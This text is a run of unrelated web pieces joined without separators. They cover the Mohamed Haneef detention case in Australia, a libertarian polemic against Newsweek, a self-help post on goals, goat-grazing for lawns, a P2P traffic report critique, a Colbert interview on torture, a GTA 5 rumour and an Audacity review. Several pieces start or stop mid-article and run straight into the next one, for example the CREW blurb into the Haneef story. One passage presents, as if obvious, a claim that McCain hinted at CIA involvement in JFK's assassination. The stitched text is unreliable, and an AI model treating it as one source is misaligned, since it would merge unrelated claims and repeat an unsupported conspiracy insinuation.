When personal profits are prioritized over ethics , and secret money damages our institutions , CREW fights abuses of power and violations of the law .
We must hold our leaders to a higher standard than simply walking the line between legality and criminality .
Since our founding in 2003 , we have worked to hold leaders of both parties accountable for unethical conduct .
By demanding transparency and ethics from our leaders , we can defend our democracy and prevent the current crisis from becoming the new normal .
But despite the public air of national emergency , Operation Rain was in trouble .
Intense police efforts here and in Britain were yielding nothing to implicate this man in the British outrages .
Police had their suspicions .
They had seized a huge amount of material to analyse .
There were many interesting leads to follow .
But after nearly a fortnight they had found nothing that would hold up in court .
And they knew it .
A document released to Haneef 's lawyers under freedom of information shows a senior investigator with Operation Rain concluding at this time : " I do not believe that I currently have sufficient evidence to charge Haneef . "
ASIO was delivering the same verdict to the Government .
Queensland police attached to Operation Rain also believed there was insufficient evidence to charge the man .
But three days later , at the end of an all - night interrogation , Haneef was charged under section 102.7 ( 2 ) of the Commonwealth 's Criminal Code with providing a SIM card to a terrorist organisation a year earlier and " being reckless as to whether the organisation was a terrorist organisation " .
How and why that charge was laid is the central question to be answered by John Clarke , QC , the former NSW Supreme Court judge now investigating the Haneef shemozzle .
Haneef found his visa cancelled and facing the prospect of immigration detention and deportation .
A mighty national controversy erupted .
A fortnight later the then Commonwealth DPP Damien Bugg , QC , intervened to discontinue the charge .
He too was " not convinced that the evidence establishes a reasonable prospect of conviction against Dr Haneef " .
Embarrassment , acrimony and blame - shifting followed .
The AFP is still ladling it out in the submission to Clarke released this week .
It is blaming the DPP for the charge ever being laid ; Scotland Yard for supplying incorrect information ; the DPP again for not publicly correcting crucial errors in police briefings ;
Haneef 's legal team for releasing transcripts of his interrogation ; and the press for too often getting the story wrong :
" The erroneous reporting was not only unhelpful to Dr Haneef and the AFP , it was unfair to the Australian community who might reasonably have expected that accurate information on such an important issue was being made available to them . "
Meanwhile , the AFP has been extremely reluctant to make basic information available .
It has declined to release the full submissions plus witness statements and documents actually given to Clarke .
No " UK - sourced information " has been released .
A pile of documents obtained under FOI by Haneef 's legal team are heavily redacted .
But they - together with submissions to Clarke from the DPP , ASIO , the Queensland Police and even the AFP - allow a fairly complete answer to be given to the question : what on earth was going on here ?
In a nutshell : they never had anything concrete to link Mohammed Haneef to his cousin 's crimes ; they were never very interested in the SIM card ; they were living all along in the hope that something damning would turn up in Britain .
The mantra of Operation Rain and the hapless DPP official drawn into the police net was : something 's on its way from over there .
But it never came .
Two Mercedes - Benz cars packed with gas canisters , petrol and nails were parked in central London early in the morning of June 29 last year by Kafeel Ahmed and an accomplice .
Police allege the second man was Dr Bilal Abdulla , an Iraqi diabetes specialist now on trial for this crime in Britain .
The bombs failed to explode .
The next day , the two men mounted a suicide ram raid on Glasgow airport .
This , too , was a fiasco .
The only casualty was Kafeel who later died of burns .
On his way north , Kafeel had sent his brother , Dr Sabeel Ahmed , an email confessing his mission .
British police and courts have accepted this jihad message as evidence that Sabeel knew nothing of his brother 's plans .
Haneef had left his SIM card with Sabeel in the summer of 2006 as he prepared to fly out to a new job and a new life in Australia .
Sabeel was not a terrorist or the member of a terrorist cell .
Giving him a SIM card could not assist - recklessly or otherwise - a terrorist organisation .
The AFP has now admitted it knew of the jihad email but this critical information never reached Haneef 's lawyers and was not given to the DPP before Haneef was charged .
The AFP argues in its submission to Clarke that the email had to be tested to make sure it was not created to help mask Sabeel 's " true knowledge " of the terrorists ' plans .
Despite the verdict of the British courts , the AFP 's submission still does not clearly endorse the email as genuine .
Phone records alerted British police to Haneef 's existence .
Far from being useful as an untraceable component in a terrorist bomb , the SIM card revealed a connection between Haneef - in whose name the card remained registered - and his cousins Sabeel , who usually paid the fees , and Kafeel , who paid them once .
With the help of some neighbours in Liverpool , England , and Sabeel 's mother in India , British police then got a message through to Haneef at the Southport Hospital on the Gold Coast : please ring .
He tried half a dozen times without success to get through to Scotland Yard 's Tony Webster .
These attempts punctuated a crowded day in which Haneef took leave from his job ; had his father - in - law buy him a ticket home to Bangalore ; left his car , laptop , documents and wife 's jewellery for safekeeping with his colleague Dr Asif Ali ; spoke several times to family members in India ; and left for Brisbane airport where , a little before midnight , he was taken into custody .
The magistrate supervising Haneef 's detention in the watchhouse never heard of those attempted calls to British police .
But it was worse than that .
Haneef 's lawyers say in their submission to Clarke : " No public statement of which we are aware by any Australian agency has referred to this crucial information as a matter relevant to or taken into account by them in their decisions concerning Dr Haneef .
The AFP 's actions in respect of this information require the closest scrutiny by the inquiry . "
Police had many reasons to be suspicious .
British police were " linking " this man to botched attempts at mass murder ; he appeared to be doing a bunk ; he had only an expensive one - way ticket ; in his baggage were documents that seemed hardly useful on a seven - day dash home ; and the sudden concern to see his newborn child seemed odd as the baby was by this time six days old .
That the AFP needed to investigate Haneef is beyond dispute .
The question is : did they have the right to detain him for nearly a fortnight without charge in the Brisbane watchhouse while they did so ?
At one point over the next few days , one of the police gave Haneef his snapshot view of the situation : they would hold him until they were absolutely certain he had had no part in the British bomb attempts .
" We obviously investigate things to a point that we can say Mohammed 's definitely not involved and we are happy and can categorically state that . "
But Haneef 's lawyers argue that this turns the law on its head .
The AFP could only hold him without charge under the anti-terrorism provisions of the Criminal Code while officers had a " reasonable belief " that he had actually committed the crime for which he was detained : giving his SIM card to a terrorist cell .
His lawyers say that certainly after the first day 's interrogation - when Haneef gave his explanation for the issues concerning police - his continued detention was unlawful .
The evidence was n't there to sustain a " reasonable belief " in his guilt .
" There was a duty … for the state of arrest to be brought to an end , and for Dr Haneef to be released . "
CLIVE PORRITT only heard about Haneef from the media .
Porritt was the Commonwealth Director of Public Prosecutions ' man in Brisbane .
Normally , the AFP would bring him in at an early stage of such operations .
Not this time .
So Porritt rang the police on the first morning of Haneef 's detention .
The DPP 's submission to Clarke states : " The officer said he appreciated [ Porritt 's ] offer of assistance but did not have the time to talk further . "
Porritt checked again next day and was told , " The AFP did not anticipate this matter coming to court imminently . "
Porritt was brought in on various bits and pieces of the case , but the DPP 's man had no role in the central , controversial and untried system of judicial supervision of a suspect 's detention .
Essentially that meant the police asking magistrate Jim Gordon for extensions of time to hold their prisoner .
The magistrate would never speak to Haneef .
Police material handed to Gordon was full of errors .
Little or nothing exculpatory was shown to the magistrate .
Gordon was told time and again of the " enormity " of the task facing police .
They always needed more time .
A huge police operation in Britain and Australia was under way .
Though heavily redacted , police documents obtained under FOI show the AFP was barely interested in the SIM card .
Operation Rain 's first priority was tracking down Haneef 's petty but complex financial dealings - including payments to and from his terrorist cousin Kafeel of a few thousand dollars over the years .
Police did not accept Haneef 's claim that these were gifts or remittances through Kafeel to his own family in Bangalore .
The question in Brisbane was : how much longer could they hold Haneef ?
With the encouragement of officers involved in his case , Haneef had hired a solicitor , Peter Russo , and he brought Stephen Keim , SC , onto the legal team .
The balance was shifting .
The lawyers were demanding to see some of the police material .
So far they had seen none .
Gordon gave police what they wanted on July 5 , but on July 9 he rejected a request for 120 hours and granted only 48 .
A fallback strategy was already in place .
Plans were well advanced to cancel Haneef 's visa and transfer him to immigration detention if the magistrate should order his release .
This was not a last - minute exigency as it would later appear , but an integral part of the strategy all along .
By whatever machinery was available , Haneef was to be kept locked up .
July 11 , when Gordon would be asked for the next extension of time , was looming as the showdown .
In preparation , the AFP collated a summary of the facts .
Clearly it did not make compelling reading .
The author of a heavily redacted AFP document - probably the senior investigating officer of Operation Rain , Ramzi Jabbour - wrote : " Having reviewed the material in possession of the investigation team at this stage and assessed that against the offences outlined above , I do not believe that I currently have sufficient evidence to charge Haneef . "
ASIO was delivering much the same conclusion on July 11 in written advice to " the Government and various agencies " .
In its submission to Clarke , ASIO says its inquiries had turned up nothing to show Haneef had foreknowledge of the British attacks .
" Nor was there any information to indicate that Dr Haneef was undertaking planning for a terrorist attack in Australia or overseas . "
Keim was allowed to see some of the AFP documents handed to the magistrate that day .
Tucked away in a sub- paragraph is the first admission that the SIM card was found , not at the scene of any of Kafeel 's crimes , but with his brother in Liverpool .
This correction of Scotland Yard 's original advice appears to have made absolutely no difference to the AFP 's approach to the case .
Gordon gave the police another 48 hours .
The showdown was postponed .
Early next morning , the AFP Commissioner , Mick Keelty , rang the Commonwealth DPP Damien Bugg who was waiting to catch a plane at Melbourne airport .
According to the DPP 's submission to Clarke , Keelty remarked : " He did not think that at that stage of the investigation that there was a case against Dr Haneef . "
Yet later that day in Brisbane , Clive Porritt was at last called in by Operation Rain to assess the case against the prisoner .
He was shown a mass of material which he found " incomplete and unfocused " but there was enough there for him to tell police they could not charge Haneef with financing terrorism .
It was the SIM card or nothing .
Police promised to prepare a briefing paper overnight .
Porritt spent most of the next day , July 13 , at AFP headquarters digesting a 48 - page brief that came with complex charts and statements .
His superiors say they made it clear to him early that afternoon that he was not to approve a charge .
If the police wanted to go down that track , it was to be on their head alone .
But for reasons that are not clear in the DPP 's submissions to Clarke , Porritt gave police what they wanted .
He says he " felt an unspoken but extreme pressure to provide positive reassurance to police that they were lawfully entitled to charge Dr Haneef …
It was a fraught and stressful time . "
Porritt advised Haneef could be charged with intentionally providing " resources " - that is , the SIM card - to a terrorist organisation " consisting of a group of persons including Sabeel Ahmed and Kafeel Ahmed , being reckless as to whether the organisation was a terrorist organisation " .
By the time he confirmed his advice in writing about 6 pm , the second long interrogation of Haneef was under way .
It would go for 12 hours until abruptly terminated about 4.30 am .
To Haneef 's barrister Keim it seemed the second examination showed how little headway the AFP had made in its investigations .
The most interesting new material was a chatroom exchange in which a number of ambiguous statements were made by Haneef and his brother .
Once again , this raised suspicions but fell way short of proof of any offence .
About dawn , Haneef 's interrogators and several Queensland police attached to Operation Rain met its commander , Ramzi Jabbour .
They had been up all night observing the interrogation .
In its submission to Clarke , Queensland police make it clear they still did n't think Haneef had a case to answer .
Detective Superintendent Gayle Hogan , the most senior Queensland officer attached to Operation Rain , told Jabbour that , based on what was known at that time , " there was insufficient evidence to support a charge against Dr Haneef " .
The submission continues : " Detective Superintendent Hogan was present when Senior Investigating Officer Jabbour had a telephone conversation with his senior AFP management and heard Senior Investigating Officer Jabbour articulate during that conversation that the [ Queensland police ] view was that there was insufficient evidence to charge Dr Haneef .
Detective Superintendent Hogan was then advised by Senior Investigating Officer Jabbour that he was going to charge Dr Haneef . "
A fortnight later , Haneef flew home to India a free man .
Australia could n't keep him .
Britain did n't want him .
The AFP 's plans had gone terribly wrong from the moment of his charging .
First , the magistrate Jacquie Payne , unimpressed by the case against him , granted him bail .
That spurred an immediate review of the case by the DPP himself , Damien Bugg .
He opted not to appeal the magistrate 's decision .
Haneef remained for the moment in detention .
Plan B had been activated and his visa cancelled .
That caused public uproar .
Embarrassment for the AFP and the Government deepened on July 20 when the ABC's London correspondent , Rafael Epstein , broke the story that the SIM card - despite all public impressions to the contrary - was not connected to the London and Glasgow bombing attempts .
That was no news to the police .
As the DPP pressed them for more evidence , they fought back , insisting Haneef was only charged because of Porritt 's advice .
Keelty would even claim later that he was " surprised " by the charging .
The AFP has told the Clarke inquiry : " If the AFP had ignored the CDPP advice this would have been without precedent .
The AFP would have been severely criticised for refusing to accept the advice , which it understood to be the settled corporate advice of the CDPP . "
Budd gave the AFP a deadline of midday July 26 to advise if there was any material forthcoming " to address the concerns about the sufficiency of the likely evidence " .
There was n't .
Next day , Budd pulled the plug .
Haneef left the country .
The AFP continued to investigate Haneef for a year without result .
In April this year , the Clarke inquiry was set up with high expectations and essentially no powers to investigate the fiasco .
It is due to report on November 14 .
" This has impacted so much of my life - my family , my career , my reputation , " Mohammed Haneef told the Herald this week .
" I hope that this inquiry gives a comprehensive account of what happened and address all the wrongs that have been done to me .
My family needs to be assured that all wrongs are corrected and redress is given . "

A source of tremendous frustration amid the financial carnage has been watching the mainstream media exemplified by Jacob Weisberg — author of The Libertarians ’ Lament in The Big Idea section of the October 27 , 2008 issue of Newsweek magazine — accuse libertarians of failing to understand the financial crisis resulted from too little government intervention not too much .
Weisberg either knows little if anything about Austrian economic theory or is a naked statist or fails to realize the American economy operates on the British economic philosophy of mercantilism , which for Weisberg ’s sake I will explain .
From the 16th to the 18th centuries , mercantilism led to some of the first instances of significant government intervention and control over the economy , and it was during this period that much of the modern capitalist system was established .
The system encouraged many wars and European imperialism .
The founding fathers understood mercantilism ’s dangers , failings , and shortcomings and strove to establish a true free market in the United States , free of government intervention .
The nation enjoyed such a true free market for most of its history until the early 20th century when mercantilism reared its ugly head disguised in part by the establishment of the Federal Reserve in 1913 .
The latest financial crisis illustrates the failure of mercantilism not the free market which is self - regulating but Weisberg either knowingly fails to point out the distinction or is ignorant of the distinction .
He openly mocks the arguments put forth by many libertarians that government intervention in the marketplace is dangerous .
From The Libertarians ’ Lament Weisberg writes , “ One line of argument casts as villain the Community Reinvestment Act , which prevents banks from ‘ redlining ’ minority neighborhoods as not creditworthy .
Another theory blames Fannie Mae and Freddie Mac for subsidizing and securitizing mortgages with an implicit government guarantee .
An alternate thesis is that past bailouts encouraged investors to behave recklessly in anticipation of a taxpayer rescue . ”
Weisberg continues “ But libertarian apologists fall wildly short of providing any convincing explanation for what went wrong . ”
Let ’s examine what went wrong with Weisberg ’s analysis or lack thereof .
First , the above actions all helped cause the current financial crisis .
These are not “ theories , ” they are truths .
One would hope a “ journalist ” and I use that term lightly would understand the difference between theories and truth .
Second , there are no “ libertarian apologists . ”
Libertarians understand government intervention and our mercantile economy are fully to blame for the current financial crisis .
Third , the “ explanation ” of what went wrong was just summarized above but apparently Weisberg does not believe it or does not want to believe it .
Here ’s one of the most unpardonable sins of the entire article .
Weisberg writes ,
“ We have narrowly avoided a global depression and are mercifully pointed toward merely the worst recession in a long while .
This is thanks to an economic meltdown made possible by libertarian ideas . ”
Hogwash !
The economic meltdown was made possible by endless government intervention , fractional reserve banking , fiat money , government control of money and monetary policy , and our modern day mercantile economy .
Weisberg continues his uninformed indictment of what he calls libertarian economic philosophy , which he fails to realize is really mercantilism not a true free market economy supported by libertarians .
“ Any competent forensic work has to put the libertarian theory of self - regulating financial markets at the scene of the crime , ” Weisberg states with a presumably straight face .
Uh , earth to Jacob , any competent journalist has to put government intervention and the mercantile economic system still alive and not - so - well in modern American at the scene of the crime !
Weisberg like so many liberal statist apologists whole - heartedly believes markets filled with traders , business people , entrepreneurs , brokers , and others in the private arena are evil and must be regulated by government .
The only lack of regulation that exists today is a lack of regulation on government itself .
Government will never restrain itself .
Leviathan ’s only goal is to expand its power , influence , and profit through force , taxation , and war .
Weisberg even fails to correctly explain the economic philosophies , private and public , of Alan Greenspan , Phil Gramm , and Christopher Cox .
The writer claims “ these men took the hands - off positions they did because of their political philosophy , which holds that markets are always right and governments always wrong to interfere . ”
Weisberg could not be more wrong .
These men did not take a hands - off philosophy .
In fact they are the ultimate meddlers in the free market !
Greenspan inflated the money supply in an orgy of government intervention while simultaneously driving interest rates below what the free market had determined were prudent and sustainable .
Gramm , the former chairman of the Senate Banking Committee make sure government worked closely with special interests to keep the whole scam going , while Christopher Cox , chairman of the SEC , made himself busy by meddling in other aspects of the market .
Weisberg quotes George Soros who called the market ’s right to buy and sell “ market fundamentalism . ”
Congrats to Soros on grasping the true nature of capitalism built upon private property and the right to buy and sell in voluntary transactions .
Weisberg uses the quote to indict what he thinks is a true free market but in reality is a mercantile economy .
Here ’s another sin committed by Weisberg , his explanation of libertarianism .
He writes , “ The best thing you can say about libertarians is that , because their views derive from abstract theory , they tend to be principled and rigorous in their logic .
Those outside the government at places like the CATO Institute and Reason magazine are just as consistent in their opposition to government bailouts as to the kind of regulation that might have prevented on from being necessary .
Let failed banks fail is the purist line .
This approach would deliver a wonderful lesson in personal responsibility , creating thousands of new jobs in the soup kitchen and food pantry industry . ”
Wrong , wrong , and more wrong !
Libertarian political philosophy does not derive from abstract theory .
It derives from common sense about private property rights , sound banking , sound money , and no government intervention .
Then Weisberg continues his wrong - headed “ analysis ” and “ explanation ” of libertarianism .
“ The worst thing you can say about libertarians is that they are intellectually immature , frozen in the worldview many of them absorbed from Ayn Rand .
Like other ideologues , libertarians react to the world by failing to confirm to their model by asking where the world went wrong .
Their heroic view of capitalism makes it difficult for them to accept that markets can be irrational , misunderstand risk , and misallocate resources or that financial systems without vigorous government oversight constitute a recipe for disaster .
They are bankrupt , and this time , there will be no bail out . ”
Weisberg has absolutely no idea what libertarianism is or he willingly misrepresents it .
Libertarians , despite Weisberg ’s assertion , are intellectually mature espousing a worldview based on liberty , private property , and true free markets .
The mainstream media exemplified by Weisberg has cornered the market on intellectual immaturity with their failure to understand Austrian economics and to accurately describe and explain libertarian political philosophy .
Weisberg gets half of the argument correct , markets can be irrational , misunderstand risk , and misallocate resources but ONLY when they are encouraged , prompted , prodded , and forced by government decree , government programs , and government force .
The mainstream media is intellectually , morally , and ethically bankrupt and Weisberg ’s entire “ argument ” is filled with lies , misunderstandings , fabrications , twists , turns , ignorance , and arrogance .
Weisberg should issue an apology for misstating , misunderstanding , and mischaracterizing the causes of the financial crisis , libertarian political philosophy , and economic theory .
The only lament libertarians have is that far too many of the mainstream media , political establishment , and everyday Americans have no clue about libertarians , Austrian economic theory , or the principles of liberty .
And that has to change in order for the country to return to its roots of true free markets , Constitutionally - protected civil liberties , peace , and prosperity .

We all want to grow .
Whether that means being more successful , having more control over our lives , being more financially secure or being happier and more content .
One thing we know for sure , day dreaming will not get us there .
We need to have goals and we need to work towards achieving them .
But so often the things we want to achieve seem so far off and so difficult that we either give up before we ’ve begun or we fall at the first hurdle .
Achieving our goals , however , does n’t have to be like this .
Here are a few suggestions for tackling goals without a lot of stress .
Be a visionary
What will your life look like when you have achieved your goal ?
First , you must want to achieve your goal and positively intend to make it happen .
If you do n’t have this conviction , then you do n’t really have a goal , just a dream .
There ’s nothing wrong with dreaming , but if you do n’t take it to the next step , you cannot achieve anything .
A visionary is not someone who simply has grand ideas , important though these ideas are .
True visionaries have every intention of turning these dreams into reality .
Ask a hundred people what , specifically , they want to achieve in the next ten years , and most will not be able to answer .
Part of my job is interviewing people , and this is a question I almost always ask , and I have almost never come across a person who gave me a good answer .
Most people , it seems , do n’t get past first base .
Take inspiration from those who have gone before
You think it ’s too hard to quit smoking ?
Millions of others have done it before .
I have done it .
Winston Churchill said that ‘ success is going from failure to failure without a lack of enthusiasm . ’
It might take you years to achieve something and , in those years , you might fail a thousand times .
But you need to pick yourself up , dust yourself off and keep going .
If you do n’t keep on trying , you ’ll fail for sure .
Inspiration in available in spades .
Look though this blog , for example .
Read about the lives of famous successful people – you ’ll find that in almost every case , that person suffered many failures along the road to final victory .
So do n’t lose heart – keep on going and , when you feel like throwing in the towel , take onboard another scoop of inspiration .
Prepare well : have a plan
If you want to get from New York to LA , you need a plan .
You need to decide whether to fly , drive , or take a train , when to set out , what to take for the journey , what to do when you get there , how long to stay , and so on .
You might not plan every last detail , but you ’ll have a good idea .
You can not achieve your goal without a plan .
You do n’t need to construct a military campaign and spend hours every week poring over your goals , but you do need to give some thought to the process .
Break your goal down into small steps
Many goals seem very difficult to achieve .
Climbing a mountain , building a successful business , becoming wealthy – all are grand enterprises .
But the mountain can only be climbed one step at a time and wealth is usually accumulated one dollar at a time .
You will need to break down your goal into lots of smaller ‘ mini - goals . ’
Think of a habit as an example .
Let ’s say you want to give up sugar .
You could go cold turkey , and this may work for you , but usually , habits can be slowly reduced until they disappear .
Start by having one sugar free day a week , then two , then three and so on , until you are only eating sugar now and again or even not at all .
Set monthly or quarterly goals .
I have a set of overall goals ( which I believe I can achieve ) and then I set quarterly and yearly goals going out for the next five years .
Working on these small goals will soon add up .
A dripping tap soon fills the bucket .
Stop struggling
We ’re often led to believe that hard work is a necessary component of success .
I do n’t believe it .
If work is a chore that you have to endure to achieve your goals , then I think work is a bad idea .
It is a kind of struggle , and struggling gets you nowhere ; like the fly caught in a web , the struggle only enmeshes you further .
As far as I ’m concerned , the puritan work ethic is a disaster – it makes us unhappy and gets us nowhere : it turns us into mice running in a wheel .
Twenty five hundred years ago , Lao Tzu , the semi-mythical author of the Taoist masterpiece , the Tao Te Ching , wrote ‘ Great good is said to be like water , sustaining life with no conscious striving , ’ and ‘ When effort is uncontrived , nothing is left undone ; the way of nature rules by allowing things to take their course . ’
Anything can be achieved given vision , proper planning and persistence .
Nowhere is great effort required .
What is needed , however , is patience , time and a sense of conviction .

Eco-friendly lawn care is an important part of a sustainable future and there are dozens of options out there , but … goats ?
There are some with more potential than others but we have seen such examples as human powered lawnmowers , solar electric robotic lawnmowers , and even propane powered lawnmowers :
But what about goats ?
Hiring 100 goats for the job of clearing an LA hillside was half the price of employing the labor of humans and is much more eco-friendly than gas - powered lawn tools .
The goats may also be more reliable and more productive than their human counterparts – not to mention more fun to watch !
A herd of 50 goats can clear about 2,000 square feet per day .
It seems a lot of people are considering the eco-friendliness of goats over traditional lawnmowers – ‘ goats for hire ’ services are popping up across the nation !
If you do n’t want to buy your own goats , there may be a company that rents goats in your area :
Akyla Farms in LaConner , WA not only specialize in free - range organic meats – they offer the services of Fiberfest and his herd .
The team of goats , supervised by Fiberfest the llama , provide custom clearing work that does n’t harm the environment .
Santa Barbara County residents can hire a herd of goats managed by dogs from Brush Goats 4 Hire .
Colorado residents in the Pacific Coast and Rocky Mountain areas can request the services of Wooly Weeders .
These goats have been serving the landscaping needs of the finest Napa Valley vineyards for years .
In the Tacoma Area , Goat Trimmers handle all types of brush jobs .
Charlottesville , VA homeowners call on Goat Busters to knock out their weed problems in an eco-friendly way .
Finding goats for rent is still not an easy task – especially for east coast residents .
Check your local Craig ’s List or your newspaper classifieds for possibilities .
You can also call around to farmers and goat breeders if there are any nearby .
What are your thoughts on goats for lawn care , clearing , and weed management ?
Do you know of any companies in your area renting goats ?

From the final presidential debate of the campaign .
terrifying during the debate was the moment when John McCain was comparing himself and Obama to Goldwater and Jack Kennedy when he described JFK ’s assassination as something like this : “ the intervention … ” ( eyes open wide , eyebrows high , grabs nose ) “ …err tragedy in Dallas … ”
Of course it was an intervention– in economic terms it would be a “ correction ” from the point of view of the continuing government , to replace the errant president .
“ Intervention ” is a well known C.I.A. term for an assassination operation , and also commonly phrased in terms of military interventions .

The Emergency Election Sale is now live !
Get 30 % to 60 % off our most popular products today !
Sandvine , best known for manufacturing the hardware that slowed down BitTorrent users on Comcast , has released an Internet traffic trends report today .
The report shows that , on average , P2P traffic is responsible for more than half of the upstream traffic , but mostly the report seems an attempt to sell their traffic shaping products .
Over the years , many Internet traffic reports have been published .
Back in 2004 , long before the BitTorrent boom had started , studies already indicated that BitTorrent was responsible for an impressive 35 % of all Internet traffic .
Since then , we ’ve seen a couple of dozen reports , all with a totally different outcome .
Some estimate that P2P traffic represents approximately 50 % of the total traffic , while others go as high as 85 % , or as low as 20 % .
The overall consensus seems to be that there is little consensus , or is there ?
We think we might have spotted a trend , not so much in the data , but in the companies that publish these reports .
Most Internet traffic research is conducted by companies that offer traffic shaping and broadband management solutions .
Cachelogic , Ipoque , Sandvine , they all sell ( or sold ) products that help ISPs to manage their traffic .
Consequently , it is not a big surprise that their presentation of the results is often a little biased .
After all , it is in their best interests to overestimate the devastating effects P2P traffic has , and convince ISPs that they need to throttle these awful bandwidth hogs .
Or as Sandvine co-founder Dave Caputo puts it : “ Bulk bandwidth applications like P2P are on all day , everyday and are unaffected by changes to network utilization .
This reinforces the importance of protecting real - time applications that are sensitive to jitter and latency during times of peak usage . ”
In Sandvine ’s report we see that P2P represents less than a quarter of all downstream traffic , and even less during peak times .
Web traffic is most dominant and online media streaming sites take up nearly 16 % .
On the upstream side , P2P traffic takes up 61 % of all traffic ( the black makes it even more scary ) , followed by web - browsing , tunneling and VoIP traffic .
Interestingly , the amount of bandwidth that is transferred on the Internet has more than quadrupled since the first reports came out a few years ago , and it is likely to quadruple again in only a few years .
Unlike Sandvine suggests , throttling is not the solution .
Investing in the network is .
Colbert : US Constitution does n't say ' do n't torture ' David Edwards and Muriel Kane
Published : Wednesday August 13 , 2008
Print This Email This Comedy Central 's Stephen Colbert set out on Tuesday to mockingly challenge author Jane Mayer 's assertion that " America is synonymous with torture . "
Mayer is the author of The Dark Side : The Inside Story of How the War on Terror Turned into a War on American Ideals .
" Walking on the dark side , " Colbert began .
" Vice President Cheney warned us we'd have to do it .
... Did you selectively forget that ? "
" I named the book after his quote , " Mayer replied .
" He said it was going to be a war we fought in the shadows , and I thought it'd be nice to shine a little light and see what that war consisted of .
...
It 's the story of how we became a torture state . "
" There 's nothing in the Constitution that says , ' Do n't torture , ' " Colbert pointed out .
" It says ' cruel and unusual .
What we 're doing may be cruel but it is no longer unusual for us to do it . "
" One of the things I write about here is how many clever lawyers it took to come up with analysis like that , " responded Mayer .
" Waterboarding ... used to be a crime , a major crime , but now it 's not any more .
Same with things like extraordinary rendition , where you could pick somebody up ... put them in a dungeon and throw away the key . "
Colbert quickly noted that those dungeons are all " in another country .
...
What I do n't know about , ' no harm , no foul . '
Except for the harmful fouls . "
Mayer continued to emphasize the distortions of language involved in the torture program , noting that " enhanced interrogation is a euphemism for hurting people on purpose . "
" You 're making it sound bad , " Colbert objected .
" ' Enhanced , ' that 's a positive term , like ' male enhancement . '
We spend lots of money .
I get emails all the time . "
Colbert then turned to Mayer 's central argument that the war on terror has damaged American ideals , saying , " Even if we torture -- Donald Rumsfeld said it best , about Abu Ghraib -- the problem here is people found out that we were doing it . "
" Ideals are eternal until you do something publicly , " Colbert explained .
" If we had never known that the government is doing this , the way the government did n't want us to know , the ideals would still be intact .
But people like you want to harm our ideals by letting us know what it is we 're doing on the dark side .
Are n't you part of the problem ? "
" It could be a real problem for some of the top people in the administration , " Mayer acknowledged .
Colbert concluded by saying optimistically , " In 1971 , the CIA led a coup that led to the overthrow and assassination of Salvador Allende in Chile ....
Now they 're kind of just three - quarters drowning people to get information .
I 'd say , is n't that progression ? "

Rockstar is really trying to make a renewed push for its products in anticipation of Red Dead Redemption 2 , but you wo n’t find many complaining .
First there was L.A. Noire ’s re-release on the Nintendo Switch , followed by the massive , free expansion for GTA Online , The Doomsday Heist .
Then L.A. Noire came out again in the form of the VR Files for HTC Vive .
It 's a good time to be a Rockstar fan .
If a couple of reports , leaks , and rumours are to believed , another Rockstar re-release is shortly on the way this year , too , and it ’s called GTA 5 : Premium Edition .
According to a listing on Amazon Germany and a mention from South Korea ’s ratings board , this version of GTA 5 will be available for PlayStation 4 and Xbox One , and includes all previous DLC for GTA Online ; Rockstar ’s massive multiplayer component of its open - world crime game .

What ’s more , Kotaku UK now reports sources confirming GTA 5 : Premium Edition will be out this April , delayed by a few weeks after an original release date of March 23 .
If that ’s the case , we should be hearing official news about the game from Rockstar very shortly , perhaps even sooner than expected if these leaks have influenced their marketing strategy in any way .
Even taking this news with a pinch of salt , that means the Premium Edition comes packed with over four years of GTA : Online DLC , including last year ’s Criminal Enterprise Starter Pack , which originally cost up to £ 39.99 / $ 59.99 and translates to over $ 10 million GTA dollars in virtual items .
A lot of previous updates for GTA Online have been free , though , such as Smuggler ’s Run , Bikers , and the Heist missions , and the absence of any new content for people who purchase the Premium Edition is somewhat disappointing , though it ’s unclear how much this version of the game will cost , or indeed whether a PC version will be available .
If any of this turns out to be true , it 's likely that you 'll be hearing more in the coming days and weeks , so stay tuned .
What are you thoughts on the prospects of another GTA 5 re-release ?
Excited ?
Bored ?
Just want Red Dead Redemption 2 in your hands already ?

The Audacity of Open Source Audio
by Ostatic Staff - Oct. 13 , 2008
The Audacity audio editor is a great program .
Take that as you will :
It 's truly functional software .
It 's a great illustration of the power and versatility of open source .
Audacity has been an active project for some time .
But because it provides an esoteric service , it was only recently I had reason to sit down and use it .
Due to microphone - support issues in Linux , and a Windows machine that has trouble with its own weight , never mind throwing sizable files in the mix , I 've used Audacity 1.3.5 on two of the three supported platforms .
There are differences in feature set - up , not function .
After a learning curve of two hours came weeks of declaring my undying love for the project to anyone who 'd listen .
Never having worked with audio files for anything other than converting formats , using Audacity for the first time was intimidating .
It was n't necessarily the layout , or the fact that the Audacity project makes it clear that the beta version is not fully documented .
It is apparent upon launching Audacity that this application has many features , and many of these features are heavy with audio - editing terminology .
I am , obviously , then , not someone who has ever worked in a recording studio .
I can't say , for sure , how Audacity compares with software used in professional environments .
I can say without reservation that Audacity offers more features than I will likely ever need editing the audio files I need to edit .
The tools for silencing ambient noise , combining , cutting , moving , and mixing tracks are first rate .
Would professional musicians use Audacity on a regular basis ?
I could n't tell you .
Would a media department in a corporate environment that needed to produce quality sound files for advertising , presentations , or promotional purposes find this useful ?
Without a doubt , Audacity would be all they 'd need .
As mentioned previously , Audacity is a cross- platform open source program .
It is able to run on Windows , Linux and Mac systems .
Though enabling certain features differed between the Windows and Linux versions , neither was difficult , and both worked flawlessly once configured .
In both cases , MP3 import / export functions needed special attention , due to the licensing / patent restrictions on the MP3 format .
Installing LAME prior to installing Audacity on Linux ( though some distributions include LAME as an Audacity dependency , others do not ) is usually all Audacity requires to associate the exporting / importing tools with the appropriate library .
Windows requires the lame_enc.dll file be present on the system , and that Audacity is directed to it through the preferences dialog .
Macs require a similar process ( though the appropriate library is different ) to incorporate MP3 functions .
Naturally , much of the recording quality comes from the hardware ( and , I 've discovered , the location of the hardware ) used , rather than the software application .
Still , even the best hardware in a decent location can pick up unintended noise .
Tracks may need leveling , compressing , or equalization .
Noise removal is very useful , and perhaps the easiest to use effect that produces the most dramatic result .
Once a track is recorded , select a few seconds of silence from the track ( or as much silence as possible up to this point ) , choose the Effects menu , and click the Noise Removal option .
A dialog will appear , and since the silence has been previously selected , clicking " Get Noise Profile " will return a result that should minimize ambient noise sufficiently ( though the user is able to change these settings ) .
It 's easy to apply to the whole track by exiting the dialog , clicking Edit , and Select All , and then entering the dialog again ( there is no need to recalculate the ambient noise , as Audacity saves this profile and associates it with the track ) .
Other effects allow users to add reverb , echoes , and generate tones , clicks and silences .
I 've never had issues importing tracks with different bitrates and sample rates into existing projects , and aligning tracks is as visual an experience as it is an audible one .
